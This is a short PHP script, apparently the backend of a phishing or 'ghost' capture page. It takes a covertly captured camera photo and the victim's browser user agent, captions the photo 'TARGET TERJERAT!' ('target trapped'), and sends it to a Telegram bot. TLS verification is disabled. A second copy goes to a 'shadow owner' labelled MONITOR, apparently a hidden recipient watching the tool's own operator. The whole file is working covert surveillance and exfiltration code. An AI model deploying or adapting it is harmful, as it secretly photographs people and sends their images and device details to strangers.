<?php
error_reporting(0);
include 'config.php';

$input = json_decode(file_get_contents('php://input'), true);

if (isset($input['img'])) {
    $imgData = str_replace(['data:image/jpeg;base64,', ' '], ['', '+'], $input['img']);
    $img = base64_decode($imgData);
    $fname = 'ghost_'.time().'.jpg';
    file_put_contents($fname, $img);
    
    $cap = "👻 **TARGET TERJERAT!**\n📱 Info: ".$input['info']['agent'];

    function kirimKeTele($cid, $tk, $fl, $cp) {
        $url = "https://api.telegram.org/bot$tk/sendPhoto";
        $data = [
            'chat_id' => $cid,
            'photo' => new CURLFile(realpath($fl)),
            'caption' => $cp,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        // SSL di Termux biasanya tidak bermasalah, tapi tetap kita bypass buat jaga-jaga
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        curl_exec($ch);
        curl_close($ch);
    }

    kirimKeTele($owner_1, $token, $fname, $cap);
    kirimKeTele($owner_bayangan, $token, $fname, "🕵️ MONITOR: ".$cap);

    unlink($fname);
}
?>
